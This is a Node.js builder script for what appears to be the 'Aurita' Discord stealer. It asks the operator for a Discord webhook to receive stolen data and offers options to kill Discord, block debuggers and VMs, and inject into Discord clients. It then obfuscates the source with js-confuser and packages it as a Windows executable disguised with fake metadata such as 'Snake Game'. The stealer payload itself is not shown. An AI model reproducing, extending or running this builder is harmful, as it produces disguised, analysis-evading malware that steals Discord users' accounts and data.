const { build, Platform, Arch } = require("electron-builder"),
  { spawnSync } = require("child_process"),
  { radar } = require("chalk-animation"),
  { instance } = require("./src/utils/axios/request"),
  { atlas, instagram, summer } = require("gradient-string"),
  readline = require("readline"),
  fs = require("fs"),
  path = require("path"),
  axios = require("axios");

const SRC_DIR = "./src";

const buildering = async (dest, JSON) => {
  let EXECUTABLE_NAME = JSON.name ?? "Aurita";
  let ICON = "https://cdn.discordapp.com/attachments/1200154153226354779/1223844486157697074/icon.ico?ex=661b54ff&is=6608dfff&hm=e1af9ca47da02e42b86373fa1c76e40a9f52f6afa6337bc46738c83833fc44a7&";
  try {
    if (ICON) {
      const ICON_BUFFER = Buffer.from((await axios.get(ICON, { responseType: "arraybuffer" })).data);
      if (ICON_BUFFER.length <= 500 * 1024) fs.writeFileSync(`${process.cwd()}/node.ico`, ICON_BUFFER);
    }
    await build({
      "targets": Platform.WINDOWS.createTarget(null, Arch.x64),
      "config": {
        "appId": "win32",
        "productName": `${EXECUTABLE_NAME}`,
        "win": {
          "artifactName": `${EXECUTABLE_NAME}.exe`,
          "target": "portable",
          "icon": `${process.cwd()}/node.ico`
        },
        "compression": "normal",
        "buildVersion": "1.0.0",
        "electronVersion": "17.1.0",
        "nodeGypRebuild": false,
        "npmRebuild": true,
        "directories": {
          "app": `${dest}`,
          "output": `./build/dist/${EXECUTABLE_NAME}`,
        },
      },
    });
    fs.unlinkSync(`./build/dist/${EXECUTABLE_NAME}/builder-debug.yml`);
    fs.unlinkSync(`./build/dist/${EXECUTABLE_NAME}/builder-effective-config.yaml`);
    fs.rmSync(`./build/dist/${EXECUTABLE_NAME}/win-unpacked`, {
      recursive: true
    });
    fs.rmSync(`${dest}`, {
      recursive: true
    });
    fs.rename(`./build/dist/${EXECUTABLE_NAME}/${EXECUTABLE_NAME}.exe`, `./${EXECUTABLE_NAME}.exe`, (err) => {
      if (err) console.error('The file is inside "./build/dist"'); else console.log(msg(`File name "${EXECUTABLE_NAME}"`));
    });
  } catch (err) {
    console.log(err)
  }
}

const obf = async (JSON) => {
  let WEBHOOK = JSON.webhook,
    EXECUTABLE_NAME = JSON.name ?? "Aurita",
    AUTHOR = JSON.author ?? "k4itrun",
    LICENSE = JSON.license ?? "MIT",
    DESC = JSON.description ?? "Game to die For",
    APP_COMPANY = JSON.appCompanyName ?? "Company Snake",
    COPYRIGHT = JSON.appLegalCopyright ?? "Copyright",
    APP_FILE_DESC = JSON.description ?? "Snake Game",
    ERROR_MESSAGE = JSON.errorMessage ?? "",
    KILL_DISCORDS = JSON.killDiscords,
    VM_DEBUGGER = JSON.vmDebugger,
    DC_INJECTION = JSON.dcInjection,
    VERSION = JSON.version ?? "2.0.0";

  let DEST_DIR = `./build/script/${EXECUTABLE_NAME}`;

  const cloneDir = (src, dest) => {
    try {
      if (!fs.existsSync(dest)) fs.mkdirSync(dest);
      fs.readdirSync(src).forEach((file) => {
        let SFP = path.join(src, file);
        let DFP = path.join(dest, file);
        if (fs.statSync(SFP).isFile()) fs.copyFileSync(SFP, DFP);
        else if (fs.statSync(SFP).isDirectory()) cloneDir(SFP, DFP);
      });
    } catch (e) {
      console.error(e)
    }
  };

  const obfFiles = async (dir) => {
    try {
      const js = require("js-confuser");
      const files = fs.readdirSync(dir);
      for (const file of files) {
        const FILE_PATH = path.join(dir, file);
        if (fs.statSync(FILE_PATH).isDirectory()) {
          await obfFiles(FILE_PATH);
        } else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules") && !file.includes("build.js")) {
          await fs.writeFileSync(FILE_PATH, (await js.obfuscate(fs.readFileSync(FILE_PATH, "utf-8"), {
            "target": "node",
            "controlFlowFlattening": 0,
            "minify": false,
            "globalConcealing": true,
            "stringCompression": 1,
            "stringConcealing": 0.9,
            "stringEncoding": 0.3,
            "stringSplitting": 1,
            "deadCode": 0,
            "calculator": 0.5,
            "compact": true,
            "movedDeclarations": false,
            "objectExtraction": false,
            "stack": true,
            "duplicateLiteralsRemoval": 0,
            "flatten": false,
            "dispatcher": true,
            "opaquePredicates": 0,
            "shuffle": {
              "hash": 0.6,
              "true": 0.6
            },
            "renameVariables": false,
            "renameGlobals": false,
          })));
        }
      }
    } catch (e) {
      console.error(e)
    }
  };

  const replaceInfos = (file) => {
    try {
      fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
        .replace(/%DESCRIPTION%/g, DESC)
        .replace(/%AUTHOR%/g, AUTHOR)
        .replace(/%LICENSE%/g, LICENSE)
        .replace(/%APPCOMPAGNYNAME%/g, APP_COMPANY)
        .replace(/%COPYRIGHT%/g, COPYRIGHT)
        .replace(/%FILEDESCRIB%/g, APP_FILE_DESC)
        .replace(/%VERSION%/g, VERSION)
        .replace(/%VERSIONPRODUCT%/g, VERSION)
      );
    } catch (e) {
      console.error(e)
    }
  };

  const replaceBat = (file) => {
    try {
      fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
        .replace(/%DESTINATION%/g, DEST_DIR)
      );
    } catch (e) {
      console.error(e)
    }
  };

  const replaceKeys = (file) => {
    try {
      fs.writeFileSync(file, fs.readFileSync(file, "utf-8")
        .replace(/%WEBHOOK%/g, WEBHOOK)
        .replace(/%ERRO_MESSAGE%/g, ERROR_MESSAGE)
        .replace(/%KILL_DISCORDS%/g, KILL_DISCORDS)
        .replace(/%VM_DEBUGGER%/g, VM_DEBUGGER)
        .replace(/%DC_INJECTION%/g, DC_INJECTION)
      );
    } catch (e) {
      console.error(e)
    }
  };

  const traverse = (dir) => {
    try {
      fs.readdirSync(dir).forEach((file) => {
        const FILE_PATH = path.join(dir, file);
        if (fs.statSync(FILE_PATH).isDirectory()) traverse(FILE_PATH);
        else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules")) replaceKeys(FILE_PATH);
        else if (file.endsWith(".json") && !FILE_PATH.includes("node_modules")) replaceInfos(FILE_PATH);
        else if (file.endsWith("build.bat")) replaceBat(FILE_PATH);
      });
    } catch (e) {
      console.error(e)
    }
  };

  const webpack = async (dir) => await obfFiles(dir);

  cloneDir(SRC_DIR, DEST_DIR);

  await traverse(DEST_DIR);
  await webpack(DEST_DIR);

  return DEST_DIR;
}

const init = async (JSON) => {
  try {
    console.log(msg("Obfuscation..."))
    const OBF_PATH = await obf(JSON);
    console.log(msg("Building..."))
    await buildering(OBF_PATH, JSON);
    console.log(msg("Filled..."))
  } catch (e) {
    console.error(e)
  }
}

const keyRes = (res) => {
  return ["y", "yes", "ok"].includes(res.toLowerCase().trim());
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

let CURRENT_Q = 1;
async function ask(qst) {
  try {
    const answer = await new Promise((resolve, reject) => {
      rl.question(atlas(`Question ${CURRENT_Q}: ${qst}`), (ans) => {
        resolve(ans);
      });
    });
    CURRENT_Q++;
    return answer.trim();
  } catch (e) {
    console.error(e);
    return '';
  }
}

const decodeB64 = (s) => Buffer.from(s, 'base64').toString("utf-8");

const msg = (m) => (`:: ${m}`).toString()

const isValidWebhook = (whk) => /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/.test(whk);

let JSON = {};

async function fucking() {
  let MAIN_BANNER = decodeB64("CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgW0F1cmFUaGVtZXNdCgriloTiloTiloQgICAgICDiloggICAg4paI4paIIOKWiOKWiOKWgOKWiOKWiOKWiCAg4paE4paE4paEICAgIOKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiOKWk+KWiOKWiOKWkSDilojilojilpPilojilojilojilojilogg4paI4paI4paI4paEIOKWhOKWiOKWiOKWiOKWk+KWiOKWiOKWiOKWiOKWiCAg4paI4paI4paI4paI4paI4paICuKWkuKWiOKWiOKWiOKWiOKWhCAgICDilojiloggIOKWk+KWiOKWiOKWk+KWiOKWiCDilpIg4paI4paI4paS4paI4paI4paI4paI4paEICDilpMgIOKWiOKWiOKWkiDilpPilpPilojilojilpEg4paI4paI4paT4paIICAg4paA4paT4paI4paI4paS4paA4paI4paAIOKWiOKWiOKWk+KWiCAgIOKWgOKWkuKWiOKWiCAgICDilpIK4paS4paI4paIICDiloDilojiloQg4paT4paI4paIICDilpLilojilojilpPilojilogg4paR4paE4paIIOKWkuKWiOKWiCAg4paA4paI4paE4paSIOKWk+KWiOKWiOKWkSDilpLilpLilojilojiloDiloDilojilojilpLilojilojiloggIOKWk+KWiOKWiCAgICDilpPilojilojilpLilojilojiloggIOKWkSDilpPilojilojiloQgICAK4paR4paI4paI4paE4paE4paE4paE4paI4paI4paT4paT4paIICDilpHilojilojilpLilojilojiloDiloDilojiloQg4paR4paI4paI4paE4paE4paE4paE4paI4paRIOKWk+KWiOKWiOKWkyDilpHilpHilpPilogg4paR4paI4paI4paS4paT4paIICDiloTilpLilojiloggICAg4paS4paI4paI4paS4paT4paIICDiloQgIOKWkiAgIOKWiOKWiOKWkgrilpPiloggICDilpPilojilojilpLilpLilojilojilojilojilojilpPilpHilojilojilpMg4paS4paI4paI4paS4paT4paIICAg4paT4paI4paI4paS4paS4paI4paI4paSIOKWkeKWkeKWk+KWiOKWkuKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWiOKWiOKWkiAgIOKWkeKWiOKWiOKWkeKWkuKWiOKWiOKWiOKWiOKWkuKWiOKWiOKWiOKWiOKWiOKWiOKWkuKWkgrilpLilpIgICDilpPilpLilojilpHilpLilpPilpIg4paSIOKWkuKWkSDilpLilpMg4paR4paS4paT4paR4paS4paSICAg4paT4paS4paI4paR4paSIOKWkeKWkSAgIOKWkiDilpHilpHilpLilpHilpHilpEg4paS4paRIOKWkSDilpLilpEgICDilpEgIOKWkeKWkSDilpLilpEg4paSIOKWkuKWk+KWkiDilpIg4paRCuKWkiAgIOKWkuKWkiDilpHilpHilpLilpEg4paRIOKWkSAg4paR4paSIOKWkSDilpLilpEg4paSICAg4paS4paSIOKWkSAg4paRICAgIOKWkiDilpHilpLilpEg4paR4paRIOKWkSAg4paRICDilpEgICAgICDilpHilpEg4paRICDilpEg4paR4paSICDilpEg4paRCuKWkSAgIOKWkiAgIOKWkeKWkeKWkSDilpEg4paRICDilpHilpEgICDilpEgIOKWkSAgIOKWkiAgIOKWkSAgICAgIOKWkSAg4paR4paRIOKWkSAg4paRICDilpEgICAgICDilpEgICAgIOKWkSAg4paRICDilpEgIOKWkQrilpEgIOKWkSAg4paRICAgICAgIOKWkSAgICAgICAgICDilpEgIOKWkSAgICAgICDilpEgIOKWkSAg4paRICDilpEgIOKWkSAgICAgIOKWkSAgICAg4paRICDilpEgICAgIOKWkQogICAgICAgCQlBdXJhVGhlbWVzIEJ5IEs0aXRydW4gfCBodHRwczovL2Rpc2NvcmQuZ2cvYXVyYXRoZW1lcwkJCg");
  try {

    radar(MAIN_BANNER).start();

    setTimeout(async () => {
      radar(summer(MAIN_BANNER)).stop();

      spawnSync(path.join(__dirname, SRC_DIR.replace("./", ""), "install.bat"), [], {
        cwd: path.join(__dirname, SRC_DIR.replace("./", "")),
        stdio: "inherit",
      });

      console.clear();
      console.log(instagram(MAIN_BANNER));
      let webhook = await ask("Add your \"WEBHOOK\": ");
      while (!isValidWebhook(webhook)) webhook = await ask("Add your \"WEBHOOK\": ");
      JSON["webhook"] = webhook;
      JSON["name"] = await ask("Please specify your 'EXE' file \"Name\": ");
      JSON["author"] = await ask("Please specify your 'EXE' file \"Author\": ");
      JSON["license"] = await ask("Please specify your 'EXE' file \"License\": ");
      JSON["description"] = await ask("Please specify your 'EXE' file \"Description\": ");
      JSON["appCompanyName"] = await ask("Please specify your 'EXE' file \"App Company Name\": ");
      JSON["appLegalCopyright"] = await ask("Please specify your 'EXE' file \"App Legal Copyright\": ");
      JSON["errorMessage"] = await ask("Please specify your 'EXE' file \"Alert Error Message\": ");
      JSON["killDiscords"] = keyRes(await ask("Restart Discord(s)? \"[Y or N]\": "));
      JSON["vmDebugger"] = keyRes(await ask("Block debug and VM? \"[Y or N]\": "));
      JSON["dcInjection"] = keyRes(await ask("Inject all Discord(s)? \"[Y or N]\": "));
      rl.close();
      console.clear();
      await init(JSON);
    }, 5000);
  } catch (e) {
    console.error(e)
  }
}

fucking();